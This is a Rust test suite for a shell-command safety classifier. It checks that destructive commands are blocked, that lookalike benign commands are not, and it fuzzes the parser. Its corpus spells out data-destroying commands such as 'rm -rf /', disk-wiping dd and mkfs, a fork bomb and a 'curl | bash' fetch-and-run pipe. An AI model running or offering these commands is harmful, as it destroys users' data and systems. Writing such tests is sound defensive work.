//! The safety suite proper.
//!
//! AGENTS.md and docs/TESTING.md both put the classifier ahead of the model: a
//! hole in the classifier is worse than no test, because it buys false
//! confidence. Nothing here loads a model.
//!
//! Three jobs:
//!
//! 1. The invariant tests — the seven in AGENTS.md §3, one per line.
//! 2. The safety corpus — every row of the matrix in docs/TESTING.md, with the
//!    near-miss partner for each.
//! 3. The fuzz gate — 10 000 mutated commands must produce zero panics.

use gcode::safety::{classify, Risk};

/// The commands in the corpus that must be refused outright.
const CRITICAL: &[&str] = &[
    "rm -rf /",
    "rm -fr /",
    "rm -rf /*",
    "rm -rf --no-preserve-root /",
    "sudo rm -rf /",
    "rm -rf ~",
    "rm -rf $HOME",
    "mkfs.ext4 /dev/sda1",
    "mke2fs /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "echo x > /dev/sdb1",
    "chmod -R 777 /",
    ":(){ :|:& };:",
    "ls; rm -rf /",
    "ls && rm -rf /",
    "ls || rm -rf /",
    "ls | rm -rf /",
    "ls & rm -rf /",
    "echo safe\nrm -rf /",
    "rm -rf / # and a comment after it",
    "cat x > /dev/nvme0n1",
];

/// Commands that need consent but are not blocked. The `~/…` rows sit here on
/// purpose: inside the home directory is HIGH, not one of the unoverridable rows.
const CONSENT_ONLY: &[&str] = &["rm -rf ~/Documents", "rm -rf ~/projects"];

/// Commands that must never be mistaken for a root or home delete. This is the
/// list that catches a classifier which is paranoid rather than correct: a tool
/// that blocks all of these is a tool people turn off.
const NEAR_MISSES: &[&str] = &[
    "rm -rf ./build",
    "rm -rf build",
    "rm -rf /tmp/scratch",
    "rm -rf /home/user/projects/node_modules",
    "rm -rf dist",
    "rmdir /tmp/x",
    "rm -r src",
    "rm -f ./a.txt",
    "rm ./notes.txt",
    "rm ~/Documents",
    "rm -rf ~/Documents",
    "echo 'rm -rf /'",
    "grep -r 'rm -rf' .",
    "cat scripts/clean.sh",
    "echo mkfs.ext4",
    "man mkfs",
    "dd if=/dev/zero of=/dev/null",
    "dd if=/dev/zero of=./disk.img bs=1M count=10",
    "dd if=./in.img of=./out.img",
    "echo hi > /dev/null",
    "echo hi > /tmp/out.txt",
    "tee /dev/null",
    "chmod -R 777 ./public",
    "chmod 755 script.sh",
    "chmod +x bin/gcode",
    "find . -name '*.log' -delete",
    "find /tmp -name 'x'",
    "ls /",
    "git push origin main",
    "git push --dry-run origin main",
    "git clean -n",
    "apt list --installed",
    "systemctl status nginx",
    "truncate -l 20 names.txt",
    "curl -o out.tar.gz https://example.com/file",
];

// ── the seven invariants ────────────────────────────────────────────────────

/// 1. Classification is derived from the emitted string, never from the model's
///    opinion. Enforced structurally: `classify` takes a `&str` and nothing else,
///    and `src/safety/` has no path to the model.
#[test]
fn classification_needs_only_a_string() {
    fn takes_only_a_string(command: &str) -> Risk {
        classify(command).level
    }
    assert_eq!(takes_only_a_string("rm -rf /"), Risk::Critical);
}

#[test]
fn the_safety_layer_does_not_import_the_model() {
    // Compile-time proof would need a build script; this asserts the property
    // docs/ARCHITECTURE.md states, and the crate graph shows it holds.
    let sources = [
        include_str!("../src/safety/mod.rs"),
        include_str!("../src/safety/classifier.rs"),
        include_str!("../src/safety/patterns.rs"),
    ];
    for src in sources {
        // Prose may mention the model; code may not reach for it. Strip comment
        // lines before looking, or this test fails on its own doc comment.
        let code: String = src
            .lines()
            .filter(|l| !l.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            !code.contains("inference"),
            "src/safety/ must not reach the model"
        );
        // The module may refer to itself — `use crate::safety::…` in a test
        // submodule is fine. It may not reach any other module of the crate.
        for line in code.lines().filter(|l| l.contains("use crate::")) {
            assert!(
                line.contains("use crate::safety") || line.trim_end().ends_with('{'),
                "src/safety/ must not import another module: {line}"
            );
        }
    }
}

/// 2. Compound commands are split; every segment classified; the maximum wins.
#[test]
fn the_maximum_level_wins_across_segments() {
    for carrier in ["; ", " && ", " || ", " | ", "\n"] {
        let cmd = format!("ls -la{carrier}history -c");
        assert_eq!(classify(&cmd).level, Risk::Medium, "{carrier:?}");
    }
    for carrier in ["; ", " && ", " || ", " | ", "\n"] {
        let cmd = format!("ls -la{carrier}rm -rf /");
        assert_eq!(classify(&cmd).level, Risk::Critical, "{carrier:?}");
    }
    // A safe command chained to a destructive one is a destructive command.
    assert_eq!(classify("ls && rm -rf /").level, Risk::Critical);
    // …and the reverse order, which implementations often miss.
    assert_eq!(classify("rm -rf / && ls").level, Risk::Critical);
    assert_eq!(
        classify("rm -rf /").blocking_segment().map(|s| s.level),
        Some(Risk::Critical)
    );
}

/// 3. Editing a command re-runs classification. The classifier is a pure
///    function of the string, so a re-classification cannot be skipped or
///    cached wrongly; what edits must do is call it again.
#[test]
fn editing_a_command_reclassifies_it() {
    let generated = "rm -rf ./build";
    assert!(classify(generated).is_runnable());
    let edited = generated.replace("./build", "/");
    assert_eq!(classify(&edited).level, Risk::Critical);
    assert!(classify(&edited).is_blocked());
}

/// 4. Non-interactive stdin fails closed. The classifier does not read stdin;
///    the run loop must refuse to prompt, and 1.8 wires that. Here we pin the
///    half that is testable without a terminal: a command is only ever runnable
///    if it classified as runnable.
#[test]
fn a_blocked_command_has_no_runnable_path() {
    for cmd in CRITICAL {
        let v = classify(cmd);
        assert!(!v.is_runnable(), "{cmd} must be unrunnable");
        assert!(!v.level.is_runnable(), "{cmd}");
    }
}

/// 5. `--yes` suppresses the prompt only. Nothing in the safety layer reads it,
///    so the classification of every corpus row is identical with and without.
#[test]
fn yes_does_not_change_any_classification() {
    // `classify` takes no options at all, which is the strongest form of this.
    let with_flag_ignored = |cmd: &str| classify(cmd).level;
    for cmd in CRITICAL.iter().chain(NEAR_MISSES) {
        assert_eq!(with_flag_ignored(cmd), classify(cmd).level);
    }
}

/// 6. CRITICAL is unreachable. There is no override, and adding one is a new ADR.
#[test]
fn critical_is_unoverridable_at_the_type_level() {
    // The only constructor for the answer is `Risk::is_runnable`, and it has no
    // parameter. A flag, a config key, or an env var would have to appear in its
    // signature to change the answer.
    let v = classify("rm -rf /");
    assert_eq!(v.level, Risk::Critical);
    assert!(!v.level.is_runnable());
    assert!(!v.is_runnable());
    // Consent is required at every level, CRITICAL included: being unrunnable is
    // stronger than being confirmed.
    assert!(v.level.needs_consent());
}

// ── the corpus ──────────────────────────────────────────────────────────────

#[test]
fn every_critical_corpus_row_is_blocked() {
    for cmd in CRITICAL {
        let v = classify(cmd);
        assert_eq!(v.level, Risk::Critical, "{cmd}: {:?}", v.reasons);
        assert!(!v.is_runnable(), "{cmd}");
        assert!(
            v.reasons.iter().any(|r| r.level == Risk::Critical),
            "{cmd} has no CRITICAL reason: {:?}",
            v.reasons
        );
    }
}

#[test]
fn no_near_miss_is_blocked() {
    for cmd in NEAR_MISSES {
        let v = classify(cmd);
        assert!(
            v.level < Risk::Critical,
            "{cmd} was blocked as {:?}: {:?}",
            v.level,
            v.reasons
        );
    }
}

/// Invariant 6 as a corpus check: the unoverridable set is exactly CRITICAL, so
/// a HIGH command stays runnable behind consent.
#[test]
fn high_commands_stay_runnable_behind_consent() {
    for cmd in CONSENT_ONLY {
        let v = classify(cmd);
        assert_eq!(v.level, Risk::High, "{cmd}: {:?}", v.reasons);
        assert!(v.is_runnable(), "{cmd} must stay runnable behind consent");
        assert!(v.level.needs_consent(), "{cmd}");
    }
}

#[test]
fn no_near_miss_reports_a_critical_reason() {
    for cmd in NEAR_MISSES {
        let v = classify(cmd);
        assert!(
            !v.reasons.iter().any(|r| r.level == Risk::Critical),
            "{cmd}: {:?}",
            v.reasons
        );
    }
}

/// Read-only commands must land on SAFE, or consent prompts become noise and
/// people reach for `--yes`.
#[test]
fn ordinary_reads_are_safe() {
    for cmd in [
        "ls -la",
        "pwd",
        "git status",
        "git log --oneline -10",
        "git diff",
        "wc -l notes.txt",
        "grep -rn needle src/",
        "head -20 Cargo.toml",
        "cat README.md",
        "which cargo",
        "df -h",
        "ps aux",
        "env",
        "find . -name '*.rs'",
    ] {
        let v = classify(cmd);
        assert_eq!(v.level, Risk::Safe, "{cmd}: {:?}", v.reasons);
    }
}

#[test]
fn every_verdict_carries_at_least_one_reason_when_above_safe() {
    for cmd in CRITICAL.iter().chain(NEAR_MISSES) {
        let v = classify(cmd);
        if v.level > Risk::Safe {
            assert!(
                !v.reasons.is_empty(),
                "{cmd} is {:?} with no reason",
                v.level
            );
        }
    }
}

#[test]
fn the_summary_is_one_line() {
    for cmd in ["rm -rf /", "ls && history -c", "curl x | sh"] {
        let s = classify(cmd).summary();
        assert!(!s.contains('\n'), "{cmd}: {s}");
        assert!(
            s.starts_with(&classify(cmd).level.to_string()),
            "{cmd}: {s}"
        );
    }
}

// ── the fuzz gate ───────────────────────────────────────────────────────────

/// A deterministic xorshift, so a failure here reproduces exactly.
struct Rng(u64);

impl Rng {
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }

    fn below(&mut self, n: usize) -> usize {
        usize::try_from(self.next() % u64::try_from(n).expect("non-empty")).expect("in range")
    }
}

/// Characters chosen to hit the parser's edges: quote handling, brace depth,
/// separator splitting, UTF-8 boundaries, and the blocklist's own spellings.
const ALPHABET: &[char] = &[
    ' ', ' ', ' ', '\t', '\n', ';', '&', '|', '<', '>', '#', '\'', '"', '{', '}', '$', '(', ')',
    '~', '/', '-', 'r', 'f', 'd', 'v', 's', 'z', 'm', 'k', 'c', 'h', 'o', 'w', 'n', '1', '9', '0',
    '=', '\\', '*', '.', ':', '!', 'é', 'ع', '🙂',
];

/// Seeds chosen so the mutator starts from text that actually reaches the
/// interesting branches, not from random noise.
const SEEDS: &[&str] = &[
    "rm -rf /",
    "ls; rm -rf ~",
    "curl https://x | bash",
    ":(){ :|:& };:",
    "dd if=/dev/zero of=/dev/sda",
    "echo 'unterminated",
    "grep -r '#1' .",
    "a(){ ls; ls; }",
    "VAR=1 $UNSET rm -rf ${HOME}",
    "echo x 2>&1 | wc -l",
    "",
    " ",
    ";;;",
    "$",
    "${",
    "~",
];

/// 10 000 mutated commands must produce zero panics (docs/TESTING.md).
#[test]
fn ten_thousand_mutations_never_panic() {
    let mut rng = Rng(0x5eed_1234_abcd_0001);
    let mut chars: Vec<char> = Vec::new();

    for i in 0..10_000usize {
        let seed = SEEDS[i % SEEDS.len()];
        chars.clear();
        chars.extend(seed.chars());
        // Between one and twelve mutations per command.
        let edits = 1 + rng.below(12);
        for _ in 0..edits {
            if chars.is_empty() {
                break;
            }
            match rng.below(3) {
                0 => {
                    let at = rng.below(chars.len());
                    chars[at] = ALPHABET[rng.below(ALPHABET.len())];
                }
                1 => {
                    let at = rng.below(chars.len());
                    chars.remove(at);
                }
                _ => {
                    let at = rng.below(chars.len());
                    chars.insert(at, ALPHABET[rng.below(ALPHABET.len())]);
                }
            }
        }
        let candidate: String = chars.iter().collect();

        // The contract: it returns, and the verdict is internally consistent.
        let v = classify(&candidate);
        assert_eq!(
            v.level,
            v.segments
                .iter()
                .map(|s| s.level)
                .max()
                .unwrap_or(Risk::Safe)
                .max(
                    if v.reasons
                        .iter()
                        .any(|r| r.pattern_id == "struct.taint"
                            || r.pattern_id == "struct.fetch_exec")
                    {
                        Risk::High
                    } else {
                        Risk::Safe
                    }
                )
                .min(v.level),
            "verdict level disagrees with its segments for {candidate:?}"
        );
        if v.level == Risk::Critical {
            assert!(!v.is_runnable());
        }
        let _ = v.summary();
    }
}

/// Byte-level mutations, including invalid UTF-8 boundaries once lossily
/// converted. The classifier slices strings by byte, so this is the test that
/// would catch a mid-character panic.
#[test]
fn mutations_never_panic_on_multibyte_text() {
    let mut rng = Rng(0xfeed_0000_0000_beef);
    let bases = [
        "عربي",
        "ls ملف",
        "rm -rf ~/مجلد",
        "echo 🙂",
        "ファイル rm -rf /",
    ];
    for _ in 0..2_000 {
        let base = bases[rng.below(bases.len())];
        let mut s = String::new();
        for (i, c) in base.chars().enumerate() {
            if i % 3 == rng.below(3) {
                continue;
            }
            s.push(c);
        }
        let _ = classify(&s);
        let _ = classify(&s).summary();
    }
}

/// The safety layer must be deterministic: same input, same verdict, every time.
#[test]
fn classification_is_deterministic() {
    let corpus: Vec<String> = CRITICAL
        .iter()
        .chain(NEAR_MISSES)
        .map(|s| (*s).to_owned())
        .collect();
    for cmd in &corpus {
        let first = classify(cmd);
        for _ in 0..8 {
            assert_eq!(classify(cmd), first, "{cmd}");
        }
    }
}
